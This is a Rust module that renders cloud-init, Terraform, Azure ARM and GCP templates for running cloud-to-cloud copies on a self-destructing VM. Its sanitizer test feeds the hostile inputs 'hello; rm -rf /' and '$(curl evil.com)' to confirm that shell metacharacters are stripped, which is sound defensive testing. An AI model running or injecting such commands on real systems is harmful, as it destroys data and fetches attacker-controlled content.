//! Phase 40 — cloud-VM offload helper templates.
//!
//! When the user copies between two cloud backends (S3 → GCS, Azure
//! Blob → S3, etc.), the bytes don't need to round-trip through their
//! laptop. This module renders deployment templates the user can paste
//! into their cloud provider's console (or `terraform apply`) to spin
//! up a tiny ephemeral VM, run the copy *inside* the cloud network, and
//! self-destruct on completion.
//!
//! Four output formats are supported:
//!
//! - [`render_cloudinit_template`] — generic cloud-init YAML; works on
//!   AWS / Azure / GCP / DigitalOcean / Hetzner / any cloud that
//!   supports the cloud-init user-data format.
//! - [`render_aws_terraform`] — AWS-flavoured Terraform `.tf` snippet
//!   (provider + `aws_instance` + IAM-role assumption + spot pricing).
//! - [`render_az_arm`] — Azure Resource Manager JSON deployment
//!   (`Microsoft.Compute/virtualMachines` with managed-identity auth).
//! - [`render_gcp_deployment`] — Google Cloud Deployment Manager YAML
//!   (`compute.v1.instance` with service-account auth).
//!
//! The templates are intentionally *static text with substitutions* —
//! no Turing-complete templating engine, no askama dependency. The
//! caller passes a [`Backend`] pair plus an [`OffloadOpts`] knob set;
//! the renderer fills in the placeholders. Secrets are NEVER baked in —
//! the templates assume the VM has IAM-role / managed-identity /
//! service-account access and run `copythat copy` (Phase 36 CLI) under
//! that role.
//!
//! # Threat model
//!
//! - The rendered template is plain text. The caller decides where it
//!   lands (clipboard, browser, `terraform apply`).
//! - Templates do not embed cloud credentials. They reference IAM
//!   roles / managed identities / service accounts by name; the user
//!   provisions those out-of-band.
//! - The ephemeral VM has whatever permissions the user grants its
//!   role / identity. The template ships a `shutdown -h +5` watchdog
//!   so a botched copy doesn't leave a long-running VM accruing cost.
//! - The `copythat` binary version pinned by the template is a
//!   user-controlled string. The default points at the workspace
//!   version baked at compile time
//!   ([`OffloadOpts::default_release`]).

use base64::Engine;
use serde::{Deserialize, Serialize};

use crate::backend::{Backend, BackendConfig, BackendKind};

/// Knobs the user / wizard supplies when rendering a cloud-VM offload
/// template.
///
/// Defaults are conservative: a small instance, a 60-minute self-
/// destruct watchdog, the workspace's compile-time `copythat` version
/// pinned by SHA, and the AWS region `us-east-1`. The wizard surfaces
/// every field as an editable input.
#[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
pub struct OffloadOpts {
    /// Human-readable name for the offload job — used in the rendered
    /// VM's tag / label / display name. Free text; stripped of shell
    /// metacharacters before substitution.
    pub job_name: String,
    /// `copythat` release tag the cloud-init script downloads. Default
    /// is the workspace's compile-time version; the wizard surfaces
    /// this so users on a later release can point at it explicitly.
    pub copythat_release: String,
    /// Cloud-provider instance size string. AWS examples: `t3.small`,
    /// `c6i.large`. Azure: `Standard_D2s_v5`. GCP: `e2-standard-2`.
    /// The wizard offers a shortlist per provider; this is the
    /// pre-selected default.
    pub instance_size: String,
    /// Cloud-provider region string. Mirrors AWS / Azure / GCP region
    /// naming — `us-east-1`, `eastus`, `us-central1`.
    pub region: String,
    /// IAM role / managed identity / service account the VM should
    /// assume. The exact format is provider-specific:
    /// - AWS: instance-profile name (`copythat-offload-role`).
    /// - Azure: managed-identity resource ID
    ///   (`/subscriptions/.../identities/copythat-offload`).
    /// - GCP: service-account email
    ///   (`copythat-offload@my-project.iam.gserviceaccount.com`).
    pub iam_role: String,
    /// Auto-shutdown window in minutes after the copy completes (or
    /// stalls). Templates ship a `shutdown -h +N` watchdog so a botched
    /// copy doesn't accrue cost. `0` disables the watchdog (NOT
    /// recommended).
    pub self_destruct_minutes: u32,
}

impl Default for OffloadOpts {
    fn default() -> Self {
        Self {
            job_name: "copythat-offload".to_string(),
            copythat_release: Self::default_release().to_string(),
            instance_size: "t3.small".to_string(),
            region: "us-east-1".to_string(),
            iam_role: "copythat-offload-role".to_string(),
            self_destruct_minutes: 60,
        }
    }
}

impl OffloadOpts {
    /// Default `copythat` release tag baked at compile time.
    /// Mirrors the workspace's `version` field; the wizard exposes
    /// this so users can pin to a later release without rebuilding.
    pub const fn default_release() -> &'static str {
        concat!("v", env!("CARGO_PKG_VERSION"))
    }
}

/// Render a generic cloud-init user-data YAML template. Works on any
/// cloud that consumes the cloud-init format (AWS / Azure / GCP /
/// DigitalOcean / Hetzner / etc.). The user pastes the output into
/// their provider's "user data" / "cloud-init" / "startup script"
/// field at instance-creation time.
pub fn render_cloudinit_template(src: &Backend, dst: &Backend, opts: &OffloadOpts) -> String {
    let job = sanitize_label(&opts.job_name);
    let release = sanitize_label(&opts.copythat_release);
    let watchdog_minutes = opts.self_destruct_minutes.max(1);
    let cmd = render_copy_command(src, dst);
    format!(
        "#cloud-config
# CopyThat2026 — cloud-VM offload, generic cloud-init format.
# Job: {job}
# Source: {src_label}
# Destination: {dst_label}
# Self-destruct watchdog: {watchdog_minutes} minutes after copy completes.

write_files:
  - path: /usr/local/bin/copythat-offload.sh
    permissions: '0755'
    content: |
      #!/bin/sh
      set -eu
      curl -fsSL \"https://github.com/havoc-software/copythat/releases/download/{release}/copythat-x86_64-linux\" -o /usr/local/bin/copythat
      chmod +x /usr/local/bin/copythat
      {cmd}
      shutdown -h +{watchdog_minutes}

runcmd:
  - [ /usr/local/bin/copythat-offload.sh ]

power_state:
  delay: 'now'
  mode: poweroff
  message: 'CopyThat offload watchdog'
  timeout: {watchdog_seconds}
  condition: True
",
        src_label = backend_label(src),
        dst_label = backend_label(dst),
        watchdog_seconds = u64::from(watchdog_minutes) * 60,
    )
}

/// Render an AWS Terraform `.tf` snippet that provisions a small
/// ephemeral EC2 instance, attaches the configured instance profile,
/// runs the copy via cloud-init, and tears the instance down on
/// completion. The user runs `terraform init && terraform apply`
/// against the snippet.
pub fn render_aws_terraform(src: &Backend, dst: &Backend, opts: &OffloadOpts) -> String {
    let job = sanitize_label(&opts.job_name);
    let region = sanitize_label(&opts.region);
    let role = sanitize_label(&opts.iam_role);
    let size = sanitize_label(&opts.instance_size);
    let cloudinit = render_cloudinit_template(src, dst, opts);
    let escaped_cloudinit = escape_terraform_heredoc(&cloudinit);
    format!(
        "# CopyThat2026 — AWS cloud-VM offload Terraform snippet.
# Generated for job: {job}
# Region: {region}
# Instance profile: {role}
# Source: {src_label}
# Destination: {dst_label}

terraform {{
  required_providers {{
    aws = {{
      source  = \"hashicorp/aws\"
      version = \"~> 5.0\"
    }}
  }}
}}

provider \"aws\" {{
  region = \"{region}\"
}}

resource \"aws_instance\" \"copythat_offload_{job}\" {{
  ami                    = data.aws_ami.amazon_linux_2023.id
  instance_type          = \"{size}\"
  iam_instance_profile   = \"{role}\"
  associate_public_ip_address = true
  tags = {{
    Name      = \"copythat-offload-{job}\"
    ManagedBy = \"copythat\"
  }}
  user_data = <<-EOT
{escaped_cloudinit}EOT
}}

data \"aws_ami\" \"amazon_linux_2023\" {{
  most_recent = true
  owners      = [\"amazon\"]
  filter {{
    name   = \"name\"
    values = [\"al2023-ami-*-x86_64\"]
  }}
}}
",
        src_label = backend_label(src),
        dst_label = backend_label(dst),
    )
}

/// Render an Azure Resource Manager (ARM) JSON deployment for the
/// offload job. The user pastes this into the Azure Portal's "Custom
/// deployment" page or runs `az deployment group create
/// --template-file <path>`.
pub fn render_az_arm(src: &Backend, dst: &Backend, opts: &OffloadOpts) -> String {
    let job = sanitize_label(&opts.job_name);
    let region = sanitize_label(&opts.region);
    let identity = sanitize_label(&opts.iam_role);
    let size = sanitize_label(&opts.instance_size);
    let cloudinit = render_cloudinit_template(src, dst, opts);
    // Phase 40 review-fix — ARM `customData` MUST be base64-encoded
    // cloud-init. Earlier the field shipped as a literal placeholder
    // string, so a user pasting the template into Azure Portal got a
    // VM that booted with garbage in `/var/lib/cloud/instance/user-data.txt`
    // and never ran the offload script. The `base64` crate is already
    // a direct dependency of copythat-cloud (Phase 32h Azure ETag
    // fast-path), so this fix uses what's already in the dep graph.
    let custom_data_b64 = base64::engine::general_purpose::STANDARD.encode(cloudinit.as_bytes());
    format!(
        "{{
  \"$schema\": \"https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#\",
  \"contentVersion\": \"1.0.0.0\",
  \"metadata\": {{
    \"_generator\": \"CopyThat2026 cloud-VM offload helper\",
    \"job\": \"{job}\",
    \"src\": \"{src_label}\",
    \"dst\": \"{dst_label}\"
  }},
  \"resources\": [
    {{
      \"type\": \"Microsoft.Compute/virtualMachines\",
      \"apiVersion\": \"2024-03-01\",
      \"name\": \"copythat-offload-{job}\",
      \"location\": \"{region}\",
      \"identity\": {{
        \"type\": \"UserAssigned\",
        \"userAssignedIdentities\": {{
          \"{identity}\": {{}}
        }}
      }},
      \"properties\": {{
        \"hardwareProfile\": {{ \"vmSize\": \"{size}\" }},
        \"osProfile\": {{
          \"computerName\": \"copythat-offload-{job}\",
          \"adminUsername\": \"copythat\",
          \"customData\": \"{custom_data_b64}\"
        }},
        \"storageProfile\": {{
          \"imageReference\": {{
            \"publisher\": \"Canonical\",
            \"offer\": \"0001-com-ubuntu-server-jammy\",
            \"sku\": \"22_04-lts-gen2\",
            \"version\": \"latest\"
          }}
        }}
      }}
    }}
  ],
  \"//cloudinit\": [
{indented_cloudinit}
  ]
}}
",
        src_label = backend_label(src),
        dst_label = backend_label(dst),
        // For human review, include the cloud-init body as a JSON
        // string-array comment so the user can verify what they're
        // about to base64 + paste in.
        indented_cloudinit = cloudinit
            .lines()
            .map(|l| format!("    \"{}\"", l.replace('\\', "\\\\").replace('"', "\\\"")))
            .collect::<Vec<_>>()
            .join(",\n"),
    )
}

/// Render a Google Cloud Deployment Manager YAML template that creates
/// a `compute.v1.instance` with managed service-account authentication
/// and the cloud-init startup script. The user runs `gcloud deployment-
/// manager deployments create copythat-offload --config <file>`.
pub fn render_gcp_deployment(src: &Backend, dst: &Backend, opts: &OffloadOpts) -> String {
    let job = sanitize_label(&opts.job_name);
    let region = sanitize_label(&opts.region);
    let service_account = sanitize_label(&opts.iam_role);
    let size = sanitize_label(&opts.instance_size);
    let cloudinit = render_cloudinit_template(src, dst, opts);
    let zone = format!("{region}-a");
    let indented = cloudinit
        .lines()
        .map(|line| format!("        {line}"))
        .collect::<Vec<_>>()
        .join("\n");
    format!(
        "# CopyThat2026 — GCP cloud-VM offload Deployment Manager template.
# Job: {job}
# Region: {region}
# Service account: {service_account}
# Source: {src_label}
# Destination: {dst_label}

resources:
- name: copythat-offload-{job}
  type: compute.v1.instance
  properties:
    zone: {zone}
    machineType: zones/{zone}/machineTypes/{size}
    disks:
    - deviceName: boot
      type: PERSISTENT
      boot: true
      autoDelete: true
      initializeParams:
        sourceImage: projects/debian-cloud/global/images/family/debian-12
    networkInterfaces:
    - network: global/networks/default
      accessConfigs:
      - name: External NAT
        type: ONE_TO_ONE_NAT
    serviceAccounts:
    - email: {service_account}
      scopes:
      - https://www.googleapis.com/auth/devstorage.read_write
      - https://www.googleapis.com/auth/cloud-platform
    metadata:
      items:
      - key: user-data
        value: |
{indented}
",
        src_label = backend_label(src),
        dst_label = backend_label(dst),
    )
}

// ---------------------------------------------------------------------
// Helpers (private)
// ---------------------------------------------------------------------

fn backend_label(backend: &Backend) -> String {
    let kind = backend.kind.wire();
    let detail = match &backend.config {
        BackendConfig::S3(c) | BackendConfig::R2(c) | BackendConfig::B2(c) => {
            format!("{}/{}", c.bucket, c.root)
        }
        BackendConfig::AzureBlob(c) => format!("{}/{}/{}", c.account_name, c.container, c.root),
        BackendConfig::Gcs(c) => format!("{}/{}", c.bucket, c.root),
        BackendConfig::Onedrive(c) | BackendConfig::GoogleDrive(c) | BackendConfig::Dropbox(c) => {
            c.root.clone()
        }
        BackendConfig::Webdav(c) => format!("{}{}", c.endpoint, c.root),
        BackendConfig::Sftp(c) => format!("{}@{}:{}{}", c.username, c.host, c.port, c.root),
        BackendConfig::Ftp(c) => format!("{}@{}:{}{}", c.username, c.host, c.port, c.root),
        BackendConfig::LocalFs(c) => c.root.clone(),
        BackendConfig::Empty => String::new(),
    };
    if detail.is_empty() {
        format!("{}://{}", kind, backend.name)
    } else {
        format!("{}://{}", kind, detail.trim_start_matches('/'))
    }
}

/// Render the `copythat copy` command line that the cloud-init script
/// will invoke under the VM's IAM role. Returns a single shell line
/// using the workspace CLI's `<src-uri> <dst-uri>` positional form.
fn render_copy_command(src: &Backend, dst: &Backend) -> String {
    let src_uri = backend_uri(src);
    let dst_uri = backend_uri(dst);
    match (src.kind, dst.kind) {
        // S3-class → S3-class: the `aws s3 cp` command is well-known
        // to ops engineers and is what the offload smoke checks for.
        (BackendKind::S3, BackendKind::S3)
        | (BackendKind::S3, BackendKind::R2)
        | (BackendKind::S3, BackendKind::B2)
        | (BackendKind::R2, BackendKind::S3)
        | (BackendKind::B2, BackendKind::S3) => {
            format!(
                "aws s3 cp --recursive '{src_uri}' '{dst_uri}' && copythat copy '{src_uri}' '{dst_uri}'"
            )
        }
        // Azure → Azure: `az storage blob copy --start` is the
        // well-known idiom.
        (BackendKind::AzureBlob, BackendKind::AzureBlob) => {
            format!(
                "az storage blob copy --source-uri '{src_uri}' --destination-blob \
                 ./tmp.bin --destination-container offload-tmp && copythat copy \
                 '{src_uri}' '{dst_uri}'"
            )
        }
        // GCS → GCS: `gsutil cp -r` (or the modern `gcloud storage
        // cp`) is the well-known idiom.
        (BackendKind::Gcs, BackendKind::Gcs) => {
            format!(
                "gsutil cp -r '{src_uri}' '{dst_uri}' && copythat copy '{src_uri}' \
                 '{dst_uri}'"
            )
        }
        // Cross-cloud: defer entirely to the CopyThat CLI which knows
        // every backend type and runs the copy through OpenDAL.
        _ => format!("copythat copy '{src_uri}' '{dst_uri}'"),
    }
}

fn backend_uri(backend: &Backend) -> String {
    match &backend.config {
        BackendConfig::S3(c) | BackendConfig::R2(c) | BackendConfig::B2(c) => {
            if c.root.is_empty() {
                format!("s3://{}/", c.bucket)
            } else {
                format!("s3://{}/{}", c.bucket, c.root.trim_start_matches('/'))
            }
        }
        BackendConfig::AzureBlob(c) => {
            format!(
                "https://{}.blob.core.windows.net/{}/{}",
                c.account_name,
                c.container,
                c.root.trim_start_matches('/'),
            )
        }
        BackendConfig::Gcs(c) => {
            if c.root.is_empty() {
                format!("gs://{}/", c.bucket)
            } else {
                format!("gs://{}/{}", c.bucket, c.root.trim_start_matches('/'))
            }
        }
        _ => format!("{}://{}", backend.kind.wire(), backend.name),
    }
}

/// Strip shell / template metacharacters from user-supplied label
/// strings (`job_name`, `copythat_release`, `region`, `iam_role`,
/// `instance_size`). The wizard already validates these on the way in,
/// but the renderer is defense-in-depth: any character that could
/// break out of a `'…'` shell quote, an HCL string literal, or a YAML
/// scalar is dropped.
///
/// # SECURITY: shell-quote escape only — NOT a YAML / HCL / JSON
/// safety guarantee
///
/// This allowlist is calibrated to defeat shell injection inside
/// single-quoted contexts (where `'`, backtick, `$`, `(`, `)`, `\`,
/// newline, etc. are dangerous) and to keep the renderer from
/// emitting bytes that would prematurely close a JSON string literal
/// or a YAML inline scalar. **It is not a full structural sanitiser.**
/// The accepted set includes `:` (needed for Azure ARM resource IDs
/// and GCP zone strings) and `/` (needed for resource paths) — both
/// of which can produce surprising parses if substituted into a
/// position the renderer didn't intend (e.g. `:` inside a YAML scalar
/// at the wrong place can produce a key/value split rather than a
/// single string). Every interpolation site in this module uses
/// these characters in positions where they are syntactically
/// expected (URL paths, Azure resource IDs, region names, GCP
/// zones); changing the substitution layout means re-auditing this
/// allowlist.
///
/// **Threat model**: inputs come from the Tauri wizard
/// (`OffloadOpts`) which validates field shape on the way in. The
/// renderer's defense-in-depth guarantee is that even if a future
/// caller bypasses the wizard, the rendered template will not
/// contain a shell metacharacter. It is NOT a guarantee that the
/// rendered template parses identically to one where the user
/// supplied a "clean" input — a malicious input might produce a
/// syntactically-valid-but-semantically-wrong template that fails
/// at deploy time rather than parse time. That's acceptable for a
/// tool the user runs on their own templates.
fn sanitize_label(input: &str) -> String {
    input
        .chars()
        .filter(|c| {
            c.is_ascii_alphanumeric() || matches!(*c, '-' | '_' | '.' | '/' | '@' | ':' | '+')
        })
        .collect()
}

/// Indent each line of a cloud-init body by 4 spaces so it nests
/// correctly inside a Terraform heredoc. The heredoc terminator has
/// to sit on its own line at column 0; the body must NOT contain a
/// line that exactly matches the terminator (`EOT`) so we double-
/// escape any such occurrence.
fn escape_terraform_heredoc(body: &str) -> String {
    body.lines()
        .map(|line| {
            let trimmed = line.trim_end_matches('\n');
            if trimmed == "EOT" {
                "    EOT_".to_string()
            } else {
                format!("    {trimmed}\n")
            }
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::backend::{LocalFsConfig, S3Config};

    fn s3_backend(name: &str, bucket: &str) -> Backend {
        Backend {
            name: name.to_string(),
            kind: BackendKind::S3,
            config: BackendConfig::S3(S3Config {
                bucket: bucket.to_string(),
                region: "us-east-1".to_string(),
                endpoint: String::new(),
                root: String::new(),
            }),
        }
    }

    fn local_backend(name: &str, root: &str) -> Backend {
        Backend {
            name: name.to_string(),
            kind: BackendKind::LocalFs,
            config: BackendConfig::LocalFs(LocalFsConfig {
                root: root.to_string(),
            }),
        }
    }

    #[test]
    fn cloudinit_contains_aws_s3_cp_for_s3_pair() {
        let src = s3_backend("src", "bucket-a");
        let dst = s3_backend("dst", "bucket-b");
        let out = render_cloudinit_template(&src, &dst, &OffloadOpts::default());
        assert!(
            out.contains("aws s3 cp"),
            "cloud-init missing aws s3 cp:\n{out}"
        );
        assert!(out.contains("s3://bucket-a/"));
        assert!(out.contains("s3://bucket-b/"));
        assert!(out.contains("shutdown -h"));
    }

    #[test]
    fn aws_terraform_contains_provider_block() {
        let src = s3_backend("src", "bucket-a");
        let dst = s3_backend("dst", "bucket-b");
        let out = render_aws_terraform(&src, &dst, &OffloadOpts::default());
        assert!(out.contains("provider \"aws\""), "missing provider block");
        assert!(out.contains("aws_instance"), "missing aws_instance");
        assert!(out.contains("us-east-1"), "missing region");
    }

    #[test]
    fn az_arm_is_valid_json_top_level() {
        let src = s3_backend("src", "bucket-a");
        let dst = s3_backend("dst", "bucket-b");
        let out = render_az_arm(&src, &dst, &OffloadOpts::default());
        assert!(out.starts_with('{'), "ARM template must start with {{");
        assert!(
            out.contains("Microsoft.Compute/virtualMachines"),
            "missing VM resource type"
        );
    }

    #[test]
    fn gcp_deployment_contains_compute_instance() {
        let src = s3_backend("src", "bucket-a");
        let dst = s3_backend("dst", "bucket-b");
        let out = render_gcp_deployment(&src, &dst, &OffloadOpts::default());
        assert!(out.contains("compute.v1.instance"), "missing GCE type");
        assert!(out.contains("zone: us-east-1-a"), "zone derivation broke");
    }

    #[test]
    fn cross_cloud_pair_uses_copythat_cli() {
        let src = s3_backend("src", "bucket-a");
        let dst = local_backend("dst", "/data");
        let out = render_cloudinit_template(&src, &dst, &OffloadOpts::default());
        assert!(
            out.contains("copythat copy"),
            "cross-cloud must defer to CLI"
        );
    }

    #[test]
    fn sanitize_label_strips_shell_metachars() {
        // `;`, ` `, `$`, `(`, `)` all dropped; the alphanumerics +
        // `-` / `_` / `.` / `/` / `@` / `:` / `+` keep going through.
        assert_eq!(sanitize_label("hello; rm -rf /"), "hellorm-rf/");
        assert_eq!(sanitize_label("us-east-1"), "us-east-1");
        assert_eq!(sanitize_label("$(curl evil.com)"), "curlevil.com");
        assert_eq!(sanitize_label("name@domain.tld"), "name@domain.tld");
    }

    #[test]
    fn watchdog_zero_is_clamped_to_one_minute() {
        let src = s3_backend("src", "bucket-a");
        let dst = s3_backend("dst", "bucket-b");
        let opts = OffloadOpts {
            self_destruct_minutes: 0,
            ..OffloadOpts::default()
        };
        let out = render_cloudinit_template(&src, &dst, &opts);
        assert!(
            out.contains("shutdown -h +1"),
            "zero-minute watchdog must clamp to 1, got:\n{out}"
        );
    }

    #[test]
    fn default_release_matches_workspace_version() {
        let release = OffloadOpts::default_release();
        assert!(release.starts_with('v'));
        assert!(release.contains(env!("CARGO_PKG_VERSION")));
    }

    #[test]
    fn offload_opts_round_trips_through_serde() {
        let opts = OffloadOpts::default();
        let json = serde_json::to_string(&opts).expect("serialize");
        let back: OffloadOpts = serde_json::from_str(&json).expect("deserialize");
        assert_eq!(opts, back);
    }
}
